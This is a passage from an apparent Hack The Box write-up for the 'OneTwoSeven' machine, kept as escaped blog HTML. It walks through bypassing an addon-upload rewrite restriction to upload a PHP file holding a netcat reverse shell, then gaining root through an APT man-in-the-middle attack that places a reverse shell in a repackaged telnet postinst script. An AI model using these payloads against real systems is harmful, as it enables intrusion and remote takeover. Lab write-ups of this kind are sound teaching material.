-			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$addon_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-				&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Disposition: attachment; filename=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$addon_file&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-				&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: text/plain&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-				&lt;span class=&quot;nb&quot;&gt;readfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$addon_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-				&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SERVER_PROTOCOL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; 404 Not Found&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-				&lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;The addon manager must not be executed directly but only via&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;the provided RewriteRules:&amp;lt;br&amp;gt;&amp;lt;hr&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;RewriteEngine On&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;RewriteRule ^addon-download.php addons/ots-man-addon.php [L]&amp;lt;br&amp;gt;&amp;lt;hr&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;By commenting individual RewriteRules you can disable single&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;features (i.e. for security reasons)&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;font size='-2'&amp;gt;Please note: Disabling a feature through htaccess leads to 404 errors for now.&amp;lt;/font&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; This part of the code tells us what we need to do :&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/\/addon-upload.php/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'REQUEST_URI'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'addon'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
-			&lt;span class=&quot;nv&quot;&gt;$errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-			&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'addon'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-			&lt;span class=&quot;nv&quot;&gt;$file_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'addon'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'size'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-			&lt;span class=&quot;nv&quot;&gt;$file_tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'addon'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'tmp_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-
-			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-				&lt;span class=&quot;nv&quot;&gt;$errors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Module too big for addon manager. Please upload manually.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$errors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-				&lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-				&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location: /menu.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-				&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: text/plain&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-				&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;File uploaded successfull.y&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; We need to have &lt;code class=&quot;highlighter-rouge&quot;&gt;/addon-upload.php&lt;/code&gt; in the request URI, we can’t request &lt;code class=&quot;highlighter-rouge&quot;&gt;/addon-upload.php&lt;/code&gt; directly because it’s disabled but we can just put a useless &lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt; parameter with the value &lt;code class=&quot;highlighter-rouge&quot;&gt;/addon-upload.php&lt;/code&gt;,  and it will pass the check.
-&lt;br /&gt; It takes the addon name from the &lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt; parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;addon&lt;/code&gt; so we have to add that parameter to the request URI.
-&lt;br /&gt; So the request URI looks like this :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/addon-download.php?addon=addons/rev.php&amp;amp;test=/addon-upload.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Request :&lt;/p&gt;
-&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/addon-download.php?addon=addons/rev.php&amp;amp;test=/addon-upload.php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;127.0.0.1:60080&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;multipart/form-data; boundary=---------------------------171386507112993851681929761040&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;326&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
-
-
------------------------------171386507112993851681929761040
-
-Content-Disposition: form-data; name=&quot;addon&quot;; filename=&quot;rev.php&quot;
-Content-Type: application/x-php
-
-&amp;lt;?php
-system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f');
-?&amp;gt;
-
------------------------------171386507112993851681929761040--
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Response :&lt;/p&gt;
-&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;302&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Found&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Thu, 29 Aug 2019 20:56:24 GMT&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Apache/2.4.25 (Debian)&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Expires&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Thu, 19 Nov 1981 08:52:00 GMT&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;no-store, no-cache, must-revalidate&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Pragma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;no-cache&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/menu.php&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;27&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/plain;charset=UTF-8&lt;/span&gt;
-
-
-File uploaded successfull.y
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Now if we check &lt;code class=&quot;highlighter-rouge&quot;&gt;/addons&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;rev.php&lt;/code&gt; is there :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/29.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/30.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;apt-mitm-root-flag&quot;&gt;APT MITM, Root Flag&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt; As &lt;code class=&quot;highlighter-rouge&quot;&gt;www-admin-data&lt;/code&gt;  we can run &lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get update&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get upgrade&lt;/code&gt; as root without a password :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-admin-data@onetwoseven:/$ sudo -l
-Matching Defaults entries for www-admin-data on onetwoseven:
-    env_reset, env_keep+=&quot;ftp_proxy http_proxy https_proxy no_proxy&quot;,
-    mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User www-admin-data may run the following commands on onetwoseven:
-    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Also when using &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; it doesn’t reset these environment variables : &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp_proxy&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;http_proxy&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;https_proxy&lt;/code&gt;
-&lt;br /&gt; We can create a fake apt repository and add a malicious package that gives us code execution. Then we can run a proxy server (burp or anything else) and set the &lt;code class=&quot;highlighter-rouge&quot;&gt;http_proxy&lt;/code&gt; variable to our server. After that we can make the proxy server use our fake repository instead of the real one by adding an entry in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;. Finally when we run &lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get update &amp;amp;&amp;amp; apt-get upgrade&lt;/code&gt; it will attempt to install our malicious package that will give us a root shell. This &lt;a href=&quot;https://versprite.com/blog/apt-mitm-package-injection/&quot;&gt;article&lt;/a&gt; was very helpful.
-&lt;br /&gt; Let’s check the sources that box is using first :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list
-# 
-
-# deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free
-
-#deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free
-
-deb http://de.deb.devuan.org/merged ascii main
-# deb-src http://de.deb.devuan.org/merged ascii main
-
-deb http://de.deb.devuan.org/merged ascii-security main
-# deb-src http://de.deb.devuan.org/merged ascii-security main
-
-deb http://de.deb.devuan.org/merged ascii-updates main
-# deb-src http://de.deb.devuan.org/merged ascii-updates main
-www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list 
-# OneTwoSeven special packages - not yet in use
-deb http://packages.onetwoseven.htb/devuan ascii main
-www-admin-data@onetwoseven:/$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; In &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/apt/sources.list.d/onetwoseven.list&lt;/code&gt; there’s an entry for &lt;code class=&quot;highlighter-rouge&quot;&gt;packages.onetwoseven.htb&lt;/code&gt;. Let’s use that.
-&lt;br /&gt; I started another burp listener on port 8181 :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/31.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; And I added &lt;code class=&quot;highlighter-rouge&quot;&gt;packages.onetwoseven.htb&lt;/code&gt; to my &lt;code class=&quot;highlighter-rouge&quot;&gt;hosts&lt;/code&gt; file and made it point to my ip :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/32.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; Now any request to &lt;code class=&quot;highlighter-rouge&quot;&gt;packages.onetwoseven.htb&lt;/code&gt; through the proxy server will be sent to my ip. Now we need to create the fake repository and the malicious package.
-&lt;br /&gt; I chose &lt;code class=&quot;highlighter-rouge&quot;&gt;telnet&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-admin-data@onetwoseven:/$ dpkg -l | grep telnet
-ii  telnet                                 0.17-41                            amd64        basic telnet client
-www-admin-data@onetwoseven:/$ apt-cache show telnet 
-Package: telnet
-Version: 0.17-41
-Installed-Size: 157
-Maintainer: Mats Erik Andersson &amp;lt;mats.andersson@gisladisker.se&amp;gt;
-Architecture: amd64
-Replaces: netstd
-Provides: telnet-client
-Depends: netbase, libc6 (&amp;gt;= 2.15), libstdc++6 (&amp;gt;= 5)
-Description: basic telnet client
-Description-md5: 80f238fa65c82c04a1590f2a062f47bb
-Source: netkit-telnet
-Tag: admin::login, interface::shell, network::client, protocol::ipv6,
- protocol::telnet, role::program, uitoolkit::ncurses, use::login
-Section: net
-Priority: standard
-Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
-Size: 72008
-MD5sum: 3409d7e40403699b890c68323e200874
-SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; The version on the box is &lt;code class=&quot;highlighter-rouge&quot;&gt;0.17-41&lt;/code&gt;, I searched for it and downloaded it :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# wget ftp.br.debian.org/debian/pool/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
---2019-08-29 23:10:54--  http://ftp.br.debian.org/debian/pool/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
-Resolving ftp.br.debian.org (ftp.br.debian.org)... 200.236.31.3, 2801:82:80ff:8000::4
-Connecting to ftp.br.debian.org (ftp.br.debian.org)|200.236.31.3|:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 72008 (70K) [application/x-debian-package]
-Saving to: ‘telnet_0.17-41_amd64.deb’
-
-telnet_0.17-41_amd64.deb                             100%[=====================================================================================================================&amp;gt;]  70.32K   113KB/s    in 0.6s    
-
-2019-08-29 23:10:56 (113 KB/s) - ‘telnet_0.17-41_amd64.deb’ saved [72008/72008]
-
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# file telnet_0.17-41_amd64.deb 
-telnet_0.17-41_amd64.deb: Debian binary package (format 2.0)
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; We will unpack it :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# dpkg-deb -R ./telnet_0.17-41_amd64.deb ./extract
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# ls -la ./extract/
-total 16
-drwxr-xr-x 4 root root 4096 Aug 29 23:12 .
-drwxr-xr-x 3 root root 4096 Aug 29 23:12 ..
-drwxr-xr-x 2 root root 4096 Nov  7  2016 DEBIAN
-drwxr-xr-x 4 root root 4096 Nov  7  2016 usr
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; And add a reverse shell payload in the post install script :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/extract/DEBIAN# nano postinst
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/extract/DEBIAN# cat postinst
-#!/bin/sh
-# $Id: postinst,v 1.4 2000/08/23 10:08:42 herbert Exp $
-
-set -e
-
-update-alternatives --install /usr/bin/telnet telnet /usr/bin/telnet.netkit 100 \
-                    --slave /usr/share/man/man1/telnet.1.gz telnet.1.gz \
-                                /usr/share/man/man1/telnet.netkit.1.gz
-
-# Automatically added by dh_installmenu
-if [ &quot;$1&quot; = &quot;configure&quot; ] &amp;amp;&amp;amp; [ -x &quot;`which update-menus 2&amp;gt;/dev/null`&quot; ]; then
-        update-menus
-fi
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1338 &amp;gt;/tmp/f
-# End automatically added section
-
-root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/extract/DEBIAN# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Then we will pack it again and change the version number :&lt;/p&gt;
